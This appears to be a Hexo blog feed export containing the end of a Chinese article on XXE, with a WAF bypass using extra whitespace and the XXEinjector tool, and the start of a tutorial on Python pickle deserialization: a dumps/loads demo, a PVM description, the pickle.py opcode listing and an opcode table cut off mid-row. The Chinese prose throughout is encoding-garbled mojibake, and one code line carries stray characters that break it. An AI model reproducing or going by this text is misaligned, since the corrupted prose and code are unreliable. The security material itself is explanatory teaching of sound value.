æ­¤æ”»å‡»è€…å¯ä»¥åœ¨<code>&lt;?xml?&gt;</code>æˆ–<code>&lt;!DOCTYPE&gt;</code>ä¸­æ’å…¥é¢å¤–çš„ç©ºæ ¼ï¼Œä»è€Œç»•è¿‡æ­¤ç±»WAF</p><h1 id="XXEå·¥å…·"><a href="#XXEå·¥å…·" class="headerlink" title="XXEå·¥å…·"></a>XXEå·¥å…·</h1><h2 id="XXEinjector"><a href="#XXEinjector" class="headerlink" title="XXEinjector"></a>XXEinjector</h2><p>XXEinjectoræ˜¯ä¸€ä¸ªä½¿ç”¨Rubyç¼–å†™çš„è‡ªåŠ¨åŒ–xxeæ¼æ´æ£€æµ‹å·¥å…·ï¼Œå¯ä»¥é€šè¿‡ç»™å®šä¸€ä¸ªhttpè¯·æ±‚çš„åŒ…ï¼Œç„¶åè®¾ç½®å¥½å¥½å‚æ•°å°±ä¼šè‡ªåŠ¨åŒ–çš„è¿›è¡Œfuzzï¼Œä»–ä¼šé€šè¿‡å†…ç½®çš„è§„åˆ™è¿›è¡Œè‡ªåŠ¨åŒ–çš„æµ‹è¯•ï¼Œå¹¶ä¸”è¿˜æ”¯æŒäºŒæ¬¡æ³¨å…¥ï¼ˆé€šè¿‡å¦ä¸€ä¸ªè¯·æ±‚è§¦å‘æ¼æ´ï¼‰ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonååºåˆ—åŒ–</title>
      <link href="/2023/07/30/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/30/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><ul><li><p><code>Python</code>çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯å°†ä¸€ä¸ªç±»å¯¹è±¡å‘å­—èŠ‚æµè½¬åŒ–ä»è€Œè¿›è¡Œå­˜å‚¨å’Œä¼ è¾“, ç„¶åä½¿ç”¨çš„æ—¶å€™å†å°†å­—èŠ‚æµè½¬åŒ–å›åŸå§‹çš„å¯¹è±¡çš„ä¸€ä¸ªè¿‡ç¨‹, è¿™ä¸ªå’Œå…¶ä»–è¯­è¨€çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–å…¶å®éƒ½å·®ä¸å¤š.</p></li><li><p><code>Python</code>ä¸­åºåˆ—åŒ–ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼: <code>pickle</code>æ¨¡å—å’Œ<code>json</code>æ¨¡å—, å‰è€…æ˜¯<code>Python</code>ç‰¹æœ‰çš„æ ¼å¼, åè€…æ˜¯<code>json</code>é€šç”¨çš„æ ¼å¼.</p></li><li><p>ç›¸è¾ƒäº<code>PHP</code>ååºåˆ—åŒ–çµæ´»å¤šæ ·çš„åˆ©ç”¨æ–¹å¼, ä¾‹å¦‚<code>POP</code>é“¾æ„é€ , <code>Phar</code>ååºåˆ—åŒ–, åŸç”Ÿç±»ååºåˆ—åŒ–ä»¥åŠå­—ç¬¦é€ƒé€¸ç­‰. <code>Python</code>ç›¸å¯¹è€Œè¨€æ²¡æœ‰<code>PHP</code>é‚£ä¹ˆçµæ´», å…³äºååºåˆ—åŒ–æ¼æ´ä¸»è¦æ¶‰åŠè¿™ä¹ˆå‡ ä¸ªæ¦‚å¿µ: <code>pickle</code>, <code>pvm</code>, <code>__reduce__</code>é­”æœ¯æ–¹æ³•. æœ¬æ–‡ä¸»è¦æ¥çœ‹çœ‹<code>pickle</code>æ¨¡å—çš„ååºåˆ—åŒ–æ¼æ´é—®é¢˜.</p></li></ul><h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><h2 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p><code>Pickle</code>å¯ä»¥ç”¨äº<code>Python</code>ç‰¹æœ‰çš„ç±»å‹å’Œ<code>Python</code>çš„æ•°æ®ç±»å‹é—´è¿›è¡Œè½¬æ¢(æ‰€æœ‰<code>Python</code>æ•°æ®ç±»å‹).</p><p><code>Python</code>æä¾›ä¸¤ä¸ªæ¨¡å—æ¥å®ç°åºåˆ—åŒ–: <code>cPickle</code>å’Œ<code>pickle</code>. è¿™ä¸¤ä¸ªæ¨¡å—åŠŸèƒ½æ˜¯ä¸€æ ·çš„, åŒºåˆ«åœ¨äº<code>cPickle</code>æ˜¯<code>C</code>è¯­è¨€å†™çš„, é€Ÿåº¦å¿«; <code>pickle</code>æ˜¯çº¯<code>Python</code>å†™çš„, é€Ÿåº¦æ…¢. åœ¨<code>Python3</code>ä¸­å·²ç»æ²¡æœ‰<code>cPickle</code>æ¨¡å—. <code>pickle</code>æœ‰å¦‚ä¸‹å››ç§æ“ä½œæ–¹æ³•:</p><div class="table-container"><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>dump</td><td>å¯¹è±¡ååºåˆ—åŒ–åˆ°æ–‡ä»¶å¯¹è±¡å¹¶å­˜å…¥æ–‡ä»¶</td></tr><tr><td>dumps</td><td>å¯¹è±¡ååºåˆ—åŒ–ä¸º bytes å¯¹è±¡</td></tr><tr><td>load</td><td>å¯¹è±¡ååºåˆ—åŒ–å¹¶ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</td></tr><tr><td>loads</td><td>ä» bytes å¯¹è±¡ååºåˆ—åŒ–</td></tr></tbody></table></div><h2 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h2><h3 id="åºåˆ—åŒ–æ“ä½œ"><a href="#åºåˆ—åŒ–æ“ä½œ" class="headerlink" title="åºåˆ—åŒ–æ“ä½œ"></a>åºåˆ—åŒ–æ“ä½œ</h3><p><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;SpongeBob&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Demo\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\tSpongeBob\x94sb.&#x27;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºçš„ä¸€å¤§ä¸²å­—ç¬¦å®é™…ä¸Šæ˜¯ä¸€ä¸²<code>PVM</code>æ“ä½œç , å¯ä»¥åœ¨<code>pickle.py</code>ä¸­çœ‹åˆ°å…³äºè¿™äº›æ“ä½œç çš„è¯¦è§£.</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/python.png" alt=""></p><h3 id="ååºåˆ—åŒ–æ“ä½œ"><a href="#ååºåˆ—åŒ–æ“ä½œ" class="headerlink" title="ååºåˆ—åŒ–æ“ä½œ"></a>ååºåˆ—åŒ–æ“ä½œ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;h3rmesk1t&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] åºåˆ—åŒ–&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] ååºåˆ—åŒ–&#x27;</span>)sssssssss</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(pickle.dumps(Demo())).name)</span><br></pre></td></tr></table></figure><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/python_01.png" alt=""></p><h1 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h1><h2 id="ç»„æˆéƒ¨åˆ†"><a href="#ç»„æˆéƒ¨åˆ†" class="headerlink" title="ç»„æˆéƒ¨åˆ†"></a>ç»„æˆéƒ¨åˆ†</h2><p><code>PVM</code>ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ:</p><ul><li>æŒ‡ä»¤å¤„ç†å™¨: ä»æµä¸­è¯»å–<code>opcode</code>å’Œå‚æ•°, å¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†. é‡å¤è¿™ä¸ªåŠ¨ä½œ, ç›´åˆ°é‡åˆ°<code>.</code>è¿™ä¸ªç»“æŸç¬¦ååœæ­¢, æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›.</li><li>æ ˆåŒº(<code>stack</code>): ç”±<code>Python</code>çš„<code>list</code>å®ç°, è¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡, åœ¨ä¸æ–­çš„è¿›å‡ºæ ˆè¿‡ç¨‹ä¸­å®Œæˆå¯¹æ•°æ®æµçš„ååºåˆ—åŒ–æ“ä½œ, å¹¶æœ€ç»ˆåœ¨æ ˆé¡¶ç”Ÿæˆååºåˆ—åŒ–çš„ç»“æœ.</li><li>æ ‡ç­¾åŒº(<code>memo</code>): ç”±<code>Python</code>çš„<code>dict</code>å®ç°, ä¸º<code>PVM</code>çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨.</li></ul><h2 id="æ‰§è¡Œæµç¨‹"><a href="#æ‰§è¡Œæµç¨‹" class="headerlink" title="æ‰§è¡Œæµç¨‹"></a>æ‰§è¡Œæµç¨‹</h2><p>é¦–å…ˆ, <code>PVM</code>ä¼šæŠŠæºä»£ç ç¼–è¯‘æˆå­—èŠ‚ç , å­—èŠ‚ç æ˜¯<code>Python</code>è¯­è¨€ç‰¹æœ‰çš„ä¸€ç§è¡¨ç°å½¢å¼, å®ƒä¸æ˜¯äºŒè¿›åˆ¶æœºå™¨ç , éœ€è¦è¿›ä¸€æ­¥ç¼–è¯‘æ‰èƒ½è¢«æœºå™¨æ‰§è¡Œ. å¦‚æœ<code>Python</code>è¿›ç¨‹åœ¨ä¸»æœºä¸Šæœ‰å†™å…¥æƒé™, é‚£ä¹ˆå®ƒä¼šæŠŠç¨‹åºå­—èŠ‚ç ä¿å­˜ä¸ºä¸€ä¸ªä»¥<code>.pyc</code>ä¸ºæ‰©å±•åçš„æ–‡ä»¶. å¦‚æœæ²¡æœ‰å†™å…¥æƒé™, åˆ™<code>Python</code>è¿›ç¨‹ä¼šåœ¨å†…å­˜ä¸­ç”Ÿæˆå­—èŠ‚ç , åœ¨ç¨‹åºæ‰§è¡Œç»“æŸåè¢«è‡ªåŠ¨ä¸¢å¼ƒ.</p><p>ä¸€èˆ¬æ¥è¯´, åœ¨æ„å»ºç¨‹åºæ—¶æœ€å¥½ç»™<code>Python</code>è¿›ç¨‹åœ¨ä¸»æœºä¸Šçš„å†™å…¥æƒé™, è¿™æ ·åªè¦æºä»£ç æ²¡æœ‰æ”¹å˜, ç”Ÿæˆçš„<code>.pyc</code>æ–‡ä»¶å°±å¯ä»¥è¢«é‡å¤åˆ©ç”¨, æé«˜æ‰§è¡Œæ•ˆç‡, åŒæ—¶éšè—æºä»£ç .</p><p>ç„¶å, <code>Python</code>è¿›ç¨‹ä¼šæŠŠç¼–è¯‘å¥½çš„å­—èŠ‚ç è½¬å‘åˆ°<code>PVM</code>(<code>Python</code>è™šæ‹Ÿæœº)ä¸­, <code>PVM</code>ä¼šå¾ªç¯è¿­ä»£æ‰§è¡Œå­—èŠ‚ç æŒ‡ä»¤, ç›´åˆ°æ‰€æœ‰æ“ä½œè¢«å®Œæˆ.</p><h2 id="æŒ‡ä»¤é›†"><a href="#æŒ‡ä»¤é›†" class="headerlink" title="æŒ‡ä»¤é›†"></a>æŒ‡ä»¤é›†</h2><p><strong>opcode</strong></p><p>ä¹Ÿå°±æ˜¯æ“ä½œç ï¼Œopcodeæ˜¯åºåˆ—åŒ–å†…å®¹çš„æ ¸å¿ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span></span><br><span class="line"><span class="comment"># here is in kind-of alphabetical order of 1-character pickle code.</span></span><br><span class="line"><span class="comment"># pickletools groups them by purpose.</span></span><br><span class="line"></span><br><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 2</span></span><br><span class="line"></span><br><span class="line">PROTO          = <span class="string">b&#x27;\x80&#x27;</span>  <span class="comment"># identify pickle protocol</span></span><br><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line">EXT1           = <span class="string">b&#x27;\x82&#x27;</span>  <span class="comment"># push object from extension registry; 1-byte index</span></span><br><span class="line">EXT2           = <span class="string">b&#x27;\x83&#x27;</span>  <span class="comment"># ditto, but 2-byte index</span></span><br><span class="line">EXT4           = <span class="string">b&#x27;\x84&#x27;</span>  <span class="comment"># ditto, but 4-byte index</span></span><br><span class="line">TUPLE1         = <span class="string">b&#x27;\x85&#x27;</span>  <span class="comment"># build 1-tuple from stack top</span></span><br><span class="line">TUPLE2         = <span class="string">b&#x27;\x86&#x27;</span>  <span class="comment"># build 2-tuple from two topmost stack items</span></span><br><span class="line">TUPLE3         = <span class="string">b&#x27;\x87&#x27;</span>  <span class="comment"># build 3-tuple from three topmost stack items</span></span><br><span class="line">NEWTRUE        = <span class="string">b&#x27;\x88&#x27;</span>  <span class="comment"># push True</span></span><br><span class="line">NEWFALSE       = <span class="string">b&#x27;\x89&#x27;</span>  <span class="comment"># push False</span></span><br><span class="line">LONG1          = <span class="string">b&#x27;\x8a&#x27;</span>  <span class="comment"># push long from &lt; 256 bytes</span></span><br><span class="line">LONG4          = <span class="string">b&#x27;\x8b&#x27;</span>  <span class="comment"># push really big long</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"></span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 4</span></span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = <span class="string">b&#x27;\x8c&#x27;</span>  <span class="comment"># push short string; UTF-8 length &lt; 256 bytes</span></span><br><span class="line">BINUNICODE8      = <span class="string">b&#x27;\x8d&#x27;</span>  <span class="comment"># push very long string</span></span><br><span class="line">BINBYTES8        = <span class="string">b&#x27;\x8e&#x27;</span>  <span class="comment"># push very long bytes string</span></span><br><span class="line">EMPTY_SET        = <span class="string">b&#x27;\x8f&#x27;</span>  <span class="comment"># push empty set on the stack</span></span><br><span class="line">ADDITEMS         = <span class="string">b&#x27;\x90&#x27;</span>  <span class="comment"># modify set by adding topmost stack items</span></span><br><span class="line">FROZENSET        = <span class="string">b&#x27;\x91&#x27;</span>  <span class="comment"># build frozenset from topmost stack items</span></span><br><span class="line">NEWOBJ_EX        = <span class="string">b&#x27;\x92&#x27;</span>  <span class="comment"># like NEWOBJ but work with keyword only arguments</span></span><br><span class="line">STACK_GLOBAL     = <span class="string">b&#x27;\x93&#x27;</span>  <span class="comment"># same as GLOBAL but using names on the stacks</span></span><br><span class="line">MEMOIZE          = <span class="string">b&#x27;\x94&#x27;</span>  <span class="comment"># store top of the stack in memo</span></span><br><span class="line">FRAME            = <span class="string">b&#x27;\x95&#x27;</span>  <span class="comment"># indicate the beginning of a new frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 5</span></span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = <span class="string">b&#x27;\x96&#x27;</span>  <span class="comment"># push bytearray</span></span><br><span class="line">NEXT_BUFFER      = <span class="string">b&#x27;\x97&#x27;</span>  <span class="comment"># push next out-of-band buffer</span></span><br><span class="line">READONLY_BUFFER  = <span class="string">b&#x27;\x98&#x27;</span>  <span class="comment"># make top of stack readonly</span></span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>æŒ‡ä»¤</th><th>æè¿°</th><th>å…·ä½“å†™æ³•</th><th>æ ˆä¸Šçš„å˜åŒ–</th></tr></thead><tbody><tr><td>c</td><td>è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—</td><td>c[module]\n[instance]\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td>o</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>o</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td></tr><tr><td>i</td><td>ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>i[module]\n[callable]\n</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td></tr><tr><td>N</td><td>å®ä¾‹åŒ–ä¸€ä¸ªNone</td><td>N</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td>S</td><td>å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td><td>Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€\â€™ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td>V</td><td>å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td><td>Vxxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td>I</td><td>å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td><td>Ixxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td>F</td><td>å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td><td>Fx.x\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td>R</td><td>é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td><td>R</td><td>å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td></tr><tr><td>.</td><td>ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td><td>.</td><td>æ— </td></tr><tr><td>(</td><td>å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td><td>(</td><td>MARKæ ‡è®°å…¥æ ˆ</td></tr><tr><td>t</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td><td>t</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ 